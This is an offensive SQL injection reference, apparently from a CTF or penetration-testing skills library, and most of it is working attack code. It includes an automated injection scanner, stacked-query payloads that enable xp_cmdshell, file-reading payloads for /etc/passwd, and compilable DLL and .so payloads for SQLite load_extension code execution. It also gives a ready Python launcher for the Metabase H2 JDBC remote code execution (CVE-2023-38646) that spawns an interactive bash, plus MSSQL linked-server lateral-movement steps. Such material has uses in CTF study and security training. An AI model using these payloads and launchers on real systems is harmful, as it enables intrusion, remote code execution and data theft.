# SQL Injection — Advanced

Per-technique scenarios in `scenarios/sql/`. This file: dense reference for automation, encoding bypasses, sensitive-file extraction, and CTF-specific RCE chains.

## Automated detection script

```python
import requests
def test_sqli(url, params):
    """Test param × payload matrix; flag changes vs baseline."""
    payloads = [
        ("err",  "'"),
        ("err2", "\""),
        ("bool-true", "' OR '1'='1"),
        ("bool-false", "' OR '1'='2"),
        ("union", "' UNION SELECT NULL--"),
        ("oob",  "' AND SLEEP(5)--"),
    ]
    baseline = requests.get(url, params=params, timeout=10).text
    for k, v in params.items():
        for name, p in payloads:
            test = {**params, k: v + p}
            r = requests.get(url, params=test, timeout=10)
            if abs(len(r.text) - len(baseline)) > 50 or r.elapsed.total_seconds() > 4.5:
                print(f"[+] Param '{k}' / payload '{name}': len_diff={len(r.text) - len(baseline)} time={r.elapsed.total_seconds()}")
```

## Stacked queries reference

```sql
-- MySQL (rare; only with multiline_results / mysql_multi_query)
1'; INSERT INTO users VALUES ('hacker','password123');#

-- PostgreSQL
'; INSERT INTO users VALUES ('hacker','password123')--

-- MSSQL
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
   EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
   EXEC xp_cmdshell 'whoami'--
```

See `scenarios/sql/stacked-queries.md`.

## Second-order injection

```python
# Phase 1 — register a payload (safely stored)
register("admin'--", "anything")
# Phase 2 — trigger the unsafe second path
update_profile()    # If query is f"UPDATE profiles SET bio='X' WHERE username='{stored}'", payload fires
```

See `scenarios/sql/second-order.md`.

## Encoding bypasses

```sql
-- URL encoding
%27 OR %271%27=%271

-- Double URL  : %2527 OR %25271%2527=%25271
-- Unicode     : ' → %C0%A7 / %EF%BC%87
-- Hex (MySQL) : 0x61646D696E   ('admin')
-- Case+cmt    : uNiOn/**/SeLeCt   /*!50000UNION*//*!50000SELECT*/
```

See `scenarios/sql/waf-bypass.md`.

## Polyglots / file extraction

```sql
-- Polyglots
' OR 1=1--    " OR ""="    ' UNION SELECT NULL,NULL,NULL--
'||(SELECT CASE WHEN 1=1 THEN (SELECT 1 FROM (SELECT SLEEP(5))x) ELSE 1 END)||'

-- MySQL
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
' UNION SELECT LOAD_FILE(0x2F666C6167),NULL--   -- /flag hex

-- PostgreSQL
'; CREATE TABLE tmp(data text); COPY tmp FROM '/flag'; SELECT data FROM tmp--
' UNION SELECT pg_read_file('/flag'),NULL--
```

**SQLite:**
```sql
' UNION SELECT sql,NULL FROM sqlite_master--
' UNION SELECT group_concat(name),NULL FROM sqlite_master WHERE type='table'--
' UNION SELECT flag,NULL FROM flags--
```

## SQLite `load_extension()` RCE

When `enable_load_extension(True)` is set (Django SQL Explorer, Metabase-style BI tools), load arbitrary DLL/SO triggering `sqlite3_extension_init` — code exec in DB process.

**Preconditions:**
- Raw `SELECT load_extension(...)` allowed.
- Separate file-write primitive (admin upload, static dir write) places the DLL/SO on disk.
- `enable_load_extension(True)` (often default in analytics tools).

**Windows DLL (`payload.c`):**
```c
#include <windows.h>
__declspec(dllexport) int sqlite3_extension_init(void *db, char **err, const void *api) {
    WinExec("cmd.exe /c whoami > C:\\path\\writable\\out.txt", SW_HIDE);
    Sleep(2000);
    return 0;
}
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID l) { return TRUE; }
```

```bash
x86_64-w64-mingw32-gcc -shared -o payload.dll payload.c -Wl,--export-all-symbols
```

**Linux .so:**
```c
#include <stdlib.h>
int sqlite3_extension_init(void *db, char **err, const void *api) {
    system("id > /tmp/out");
    return 0;
}
```

```bash
gcc -shared -fPIC -o payload.so payload.c
```

**Invocation (NOTE: pass path WITHOUT extension — SQLite appends):**
```sql
SELECT load_extension('C:\\path\\to\\payload');
SELECT load_extension('/tmp/payload');
```

**Custom entry point:** SQLite tries `sqlite3_<basename>_init` if `sqlite3_extension_init` absent. Name DLL/SO accordingly.

**Indirect execution:** if `WinExec`/`system()` blocked, launch interpreter on disk (`python.exe <script>`) pointing at uploaded script — bypasses PowerShell GPO.

## H2 JDBC URL → JavaScript Trigger RCE

Apps that pass attacker-controlled JDBC URL to `org.h2.Driver` (BI tools, "test connection" wizards, no-code DB validators) → pre-auth RCE because H2 supports embedded JS triggers.

**Detection:**
- "Validate database / test connection" endpoints accepting freeform JDBC URL or `engine=h2`.
- `org.h2`/`h2-*.jar`/`h2.jar` in stack traces.
- Setup / first-run wizard endpoints accepting connection details before auth.

**Working JDBC URL (H2 v2.x):**
```
zip:/app/<app>.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\;CREATE TRIGGER <RAND> BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript
java.lang.Runtime.getRuntime().exec('bash -c {echo,<B64_CMD>}|{base64,-d}|{bash,-i}')
$$--=x
```

**Critical gotchas:**
1. JS body MUST use single-string `Runtime.getRuntime().exec(...)`. `new String[]{...}` introduces `,{}` characters that break H2's SQL parser BEFORE the trigger source.
2. Single-string form splits on whitespace — use bash brace expansion `{echo,<b64>}|{base64,-d}|{bash,-i}` to ship multi-arg command without spaces.
3. Trigger names MUST be unique per request — randomize: `''.join(random.choice(string.ascii_uppercase) for _ in range(12))`.
4. B64 padding leaks into JSON/URL. Pad cleartext until b64 has no trailing `=`.
5. Lower layer parses trigger source as SQL, bails out, but trigger HAS FIRED. HTTP response is **misleading**: 400 with "Syntax error" is SUCCESS — verify only via reverse shell / HTTP callback, never response body.
6. Use `$$...$$` delimiters around JS body. Real `\n` between `//javascript` and JS — do NOT URL-encode.

**Reusable Python launcher:**
```python
import base64, random, string, requests
def h2_trigger_rce(target_url, jdbc_field, command, extra=None):
    enc = base64.b64encode(command.encode()).decode()
    while enc.endswith('='):
        command += ' '
        enc = base64.b64encode(command.encode()).decode()
    rand = ''.join(random.choice(string.ascii_uppercase) for _ in range(12))
    db = (f"zip:/app/x.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\;"
          f"CREATE TRIGGER {rand} BEFORE SELECT ON INFORMATION_SCHEMA.TABLES "
          f"AS $$//javascript\n"
          f"java.lang.Runtime.getRuntime().exec('bash -c {{echo,{enc}}}"
          f"|{{base64,-d}}|{{bash,-i}}')\n$$--=x")
    payload = {**(extra or {}), jdbc_field: {"db":db,"advanced-options":False,"ssl":True}}
    return requests.post(target_url, json=payload, timeout=30)
```

**Affected:** Metabase < 0.46.6.1 (CVE-2023-38646) — `/api/setup/validate`. Any H2-backed admin endpoint with freeform JDBC URL.

## Blind flag extraction / locations

```python
for i in range(1, 100):
    for c in string.printable:
        p = f"' AND (SELECT SUBSTRING(flag,{i},1) FROM flags)='{c}'--"
        if "success_indicator" in requests.get(f"http://target/?q={p}").text:
            flag += c; break
    else: break
```

CTF files: `/flag`, `/flag.txt`, `/app/flag*`, `/home/*/flag.txt`, `/tmp/flag`. Tables: `flags`, `secret`, `flag`, `ctf`.

## MSSQL linked servers — lateral movement

`SELECT name,is_linked,is_data_access_enabled,is_rpc_out_enabled FROM sys.servers` reveals linked servers (often a second instance on the same host, e.g. `WEB\CLIENTS`). The failure mode is the key signal:

- **`uses_self_credential` / empty `sys.linked_logins`** → the link forwards *your current login*. A SQL-only login (`webappusr`) with no matching login on the remote gets `OPENQUERY` → **"Login failed for user 'X'"**. Self-cred is NOT dead — it needs a credential the remote accepts.
- **The unlock is an explicit credential found elsewhere.** Self-cred `OPENQUERY` via blind injection can never *supply* a password. Once you recover a real DB cred (trace logs `C:\Logs\...\*.trc`, a compiled DLL/config, app source), connect with a client that maps to a trusted login — then it works:
  ```sql
  SELECT * FROM openquery([HOST\INST],'SELECT name FROM clients..sysobjects WHERE xtype=''U''');
  SELECT * FROM openquery([HOST\INST],'SELECT * FROM clients..card_details');
  ```
- **Ad-hoc explicit cred** (needs sysadmin to enable; usually off for low-priv): `OPENROWSET('SQLNCLI','Server=HOST\INST;Uid=..;Pwd=..','SELECT ...')`. Returns "Ad Hoc Distributed Queries ... turned off" if disabled — don't chase without sysadmin.

### Blind SQLi → real interactive connection
A recovered DB password upgrades blind web-layer injection to a **direct 1433 connection** (`mssqlclient.py`; `nxc mssql --local-auth` for SQL logins). Same privileges, but full multi-statement batches, real error messages (informative linked-server/permission failures instead of silent), and you can pass explicit credentials. Always pursue it once you have creds. Gotchas:
- `mssqlclient.py -file` runs **each line as a separate batch** — `DECLARE @x` won't survive to the next line. Put `DECLARE ...; EXEC ...; SELECT @x` on **one line**.
- Commonly **denied/neutered** for low-priv (don't over-invest): `xp_regread`/`xp_instance_regenumvalues` (Access denied), `xp_dirtree`/`xp_fileexist` (empty for non-sysadmin), `xp_cmdshell`/OLE Automation/Ad Hoc Distributed Queries (off, can't enable). `sys.sql_logins` usually shows only `sa` + the app user — no Windows logins means a self-cred link has nothing to map, confirming the cred must come from outside SQL.

(Real case: HTB Context — `webappusr` self-cred `OPENQUERY([WEB\CLIENTS])` failed for 5 sessions; the unlock was `karl.memaybe`'s password from `C:\Logs\WEBDB\*.trc`, whose domain login the linked server accepted → `card_details` flag.)

## References

`scenarios/sql/`, `sql-injection-quickstart.md`, `injection-principles.md`, `skills/coordination/reference/principles.md` (Re-verify the primitive), `skills/source-code-scanning/reference/secrets-detection.md` (compiled-artifact secrets).
